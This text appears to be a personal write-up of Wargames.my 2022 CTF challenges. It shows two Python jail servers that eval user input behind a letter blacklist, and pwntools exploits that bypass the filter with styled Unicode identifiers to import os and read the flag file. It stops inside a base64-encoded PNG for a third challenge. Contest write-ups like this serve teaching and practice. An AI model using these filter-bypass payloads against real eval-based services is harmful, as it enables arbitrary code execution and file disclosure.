# Wargames.my 2022 - Writeup
This was my third wgmyCTF and the first time in student category.
It was relatively chill for me considering my last CTF was hack.lu CTF 2022 (which was absolute hell, but not in a bad way).

I am participating under `CAPTCHA the Flag` this year along with some of my friends. We managed to rank in quite high this year, which was mostly satisfying albeit with some regrets.

Overall, I managed to learn quite a few things too, especially on reversing python and steganography techniques. There were little to no guessy challenges, so all round it was a pretty pleasant experience.

## Table of Contents
- [**Misc**](#misc)
    - [**Secure Dream 1.0** - Simple PyJail 1](#secure-dream-10)
    - [**Secure Dream 2.0** - Simple PyJail 2](#secure-dream-20)
    - [**Pxrtxblx Nxtwxrk Grxphxcs** - PNG recovery](#pxrtxblx-nxtwxrk-grxphxcs)
- [**Reverse**](#reverse)
    - [**Stable** - Python deobfuscation](#stable)
    - [**Ular** - Python executable reverse](#ular)
- [**Web**](#web)
    - [**Christmas Wishlist** - Simple SSTI](#christmas-wishlist)
    - [**Christmas Wishlist 2** - Fancy SSTI](#christmas-wishlist-2)
    - [**Most Friendly App** - IDOR with TOTP](#most-friendly-app)
    - [**Eureka!** - Wayback machine + Hidden HTTP data](#eureka)
- [**Steganography**](#steganography)
    - [**Color** - Image RGB plane](#color)
- [**OSINT**](#osint)
    - [**Where Am I** - Google Maps recon](#where-am-i)
    - [**Who Am I** - Social media recon](#who-am-i)
- [**Boot2root**](#boot2root)
     - [**Sanity Check (TryHackMe)**](#sanity-check-tryhackme)
- [**Unsolved Challenges** (Other writeups)](#unsolved-challenges)

## Misc
### Secure Dream 1.0
> Let me know your dreams. Could your dreams bypass my expectation?

[*Back to top*](#table-of-contents)
<details>
<summary>Source of <code>server.py</code></summary>

```py
#!/usr/bin/env python3

print('''\033[94m
‚ô° ‚òÜ .‚ô°‚Äß‚ÇäÀö 
‚ï≠‚óú‚óù Õ° ‚óú‚óù‚ïÆ  „Ö§ ‚ï≠‚óú‚óù Õ° ‚óú‚óù‚ïÆ. 
(             )  ‚ô°   (             )‚òÜ ‚ô°
‚ï∞‚óü‚óû Õú ‚óü‚óû‚ï≠‚óú‚óù Õ° ‚óú‚óù‚ïÆ Õú ‚óü‚óû‚ïØ‚ô° 
. ‚òÜ  „Ö§„Ö§(                )‚òÜ ‚ô°
‚ô° „ÄÄ      ‚ï∞‚óü‚óû Õú ‚óü‚óû‚ïØ . ‚òÜ

	[Secure Dream v1.0]
\033[0m''')

payload = input("What is your dream in life?\n")
if any(filter(lambda c: c in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"\'', payload)):
	print("\nAùíòùíò... WùíÜ ùíÖùíêùíè'ùíï ùíñùíèùíÖùíÜùíìùíîùíïùíÇùíèùíÖ ùíöùíêùíñùíì ùíÖùíìùíÜùíÇùíé :(")
else:
	eval(payload)
```
</details>

#### Reading the code
From the `if` condition in the code, we can see that it is applying a **blacklist filter** of the character set `[a-zA-Z'"]` on user input before the code is being evaluated.<br>
This seemingly provides protection over any code creation since there is no way to write an exploit without using alphabets in modern python, unlike javascript where [type confusion is rampant](https://utf-8.jp/public/jjencode.html).

#### Encoding
Fotunately, as hinted in the error message (`"WùíÜ ùíÖùíêùíè'ùíï ùíñùíèùíÖùíÜùíìùíîùíïùíÇùíèùíÖ ùíöùíêùíñùíì ùíÖùíìùíÜùíÇùíé"`), python employs Unicode's NFKC normalisation (read: fancy-to-boring character conversion) to all [identifiers](https://github.com/python/cpython/blob/91a8e002c21a5388c5152c5a4871b9a2d85f0fc1/Parser/pegen.c#L450-L451) and [keywords](https://docs.python.org/3/reference/lexical_analysis.html#identifiers).<br>
Therefore, we could completely bypass the alphabets (`[a-zA-Z]`) restriction by **supplying a [styled Unicode character](https://www.unicode.org/charts/PDF/U1D400.pdf)**. A quick google search reveal this [handy website](https://yaytext.com/bold-italic/) that can do the conversion for us.

#### Exploit
To read the flag file, we can simply do `print(open("flag.txt").read())` but since quotes are blacklisted, we need to find an alternative way to construct a string. There're a lot of methods to acheieve this, the simplest is arguably **using a lot of `chr()` calls** with character code and add them together.

Skip this section if you only care about the straightforward solution:<br>
I went a different route during the CTF. I used `__builtins__.__import__("os").listdir()` to peek into the current working directory to find the position of the flag file. Noticing it is the last file, I added a `[-1]` subscription to get the filename. For `"os"`, `chr(111)+chr(115)` can be used but I did `repr(__builtins__.__import__)[24]+chr(ord(repr(__builtins__.__import__)[24])+4)` instead, it looks funny but it works.

Finally, just convert the exploitation code into fancy unicode string and feed it to the server, and voil√†, `wgmy{ab065d1d896dcdc228d5f19077501838}` pops.

<details>
<summary>Full exploit</summary>

```py
from pwn import *

EXP = 'ùíëùíìùíäùíèùíï(ùíêùíëùíÜùíè(__ùëèùë¢ùëñùëôùë°ùëñùëõùë†__.__ùëñùëöùëùùëúùëüùë°__(ùëüùëíùëùùëü(__ùëèùë¢ùëñùëôùë°ùëñùëõùë†__.__ùëñùëöùëùùëúùëüùë°__)[24]+ùëê‚Ñéùëü(ùëúùëüùëë(ùëüùëíùëùùëü(__ùëèùë¢ùëñùëôùë°ùëñùëõùë†__.__ùëñùëöùëùùëúùëüùë°__)[24])+4)).ùëôùëñùë†ùë°ùëëùëñùëü()[-1]).ùíìùíÜùíÇùíÖ())'

socket = remote("securedream.wargames.my", 50255)

socket.sendline(EXP)
socket.interactive()
```
</details>

### Secure Dream 2.0
> Can you really bypass another dreams?

[*Back to top*](#table-of-contents)
<details>
<summary>Source of <code>server.py</code></summary>

```py
#!/usr/bin/env python3

print('''\033[94m
‚ô° ‚òÜ .‚ô°‚Äß‚ÇäÀö 
‚ï≠‚óú‚óù Õ° ‚óú‚óù‚ïÆ  „Ö§ ‚ï≠‚óú‚óù Õ° ‚óú‚óù‚ïÆ. 
(             )  ‚ô°   (             )‚òÜ ‚ô°
‚ï∞‚óü‚óû Õú ‚óü‚óû‚ï≠‚óú‚óù Õ° ‚óú‚óù‚ïÆ Õú ‚óü‚óû‚ïØ‚ô° 
. ‚òÜ  „Ö§„Ö§(                )‚òÜ ‚ô°
‚ô° „ÄÄ      ‚ï∞‚óü‚óû Õú ‚óü‚óû‚ïØ . ‚òÜ

	[Secure Dream v2.0]
\033[0m''')

payload = input("What is your dream in life?\n")
# More secure?
if any(filter(lambda c: c in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"\'+', payload)):
        print("\nAùíòùíò... WùíÜ ùíÖùíêùíè'ùíï ùíñùíèùíÖùíÜùíìùíîùíïùíÇùíèùíÖ ùíöùíêùíñùíì ùíÖùíìùíÜùíÇùíé :(")
else:
        eval(payload)
```
</details>

Basically all the same with the first version but with `+` blacklisted.<br>
This isn't a problem since `a + b` in python just means `a.__add__(b)`, we can just simply convert everyting to this format and proceed to exploitation.<br>
Flag: `wgmy{2d2c3bd7230a9c3d0aed87dc62ccf2e4}`

<details>
<summary>Full exploit</summary>

```py
from pwn import *

EXP = 'ùò±ùò≥ùò™ùòØùòµ(ùò∞ùò±ùò¶ùòØ(__ùò£ùò∂ùò™ùò≠ùòµùò™ùòØùò¥__.__ùò™ùòÆùò±ùò∞ùò≥ùòµ__(ùò≥ùò¶ùò±ùò≥(__ùò£ùò∂ùò™ùò≠ùòµùò™ùòØùò¥__.__ùò™ùòÆùò±ùò∞ùò≥ùòµ__)[24].__ùò¢ùò•ùò•__(ùò§ùò©ùò≥(ùò∞ùò≥ùò•(ùò≥ùò¶ùò±ùò≥(__ùò£ùò∂ùò™ùò≠ùòµùò™ùòØùò¥__.__ùò™ùòÆùò±ùò∞ùò≥ùòµ__)[24]).__ùò¢ùò•ùò•__(4)))).ùò≠ùò™ùò¥ùòµùò•ùò™ùò≥()[-1]).ùò≥ùò¶ùò¢ùò•())'

socket = remote("securedream.wargames.my", 30555)

socket.sendline(EXP)
socket.interactive()
```
</details>

### Pxrtxblx Nxtwxrk Grxphxcs
> Cxn yxx rxcxvxr xt?

[*Back to top*](#table-of-contents)
<details>
<summary>Base64 encoded <code>chal.png</code></summary>

```
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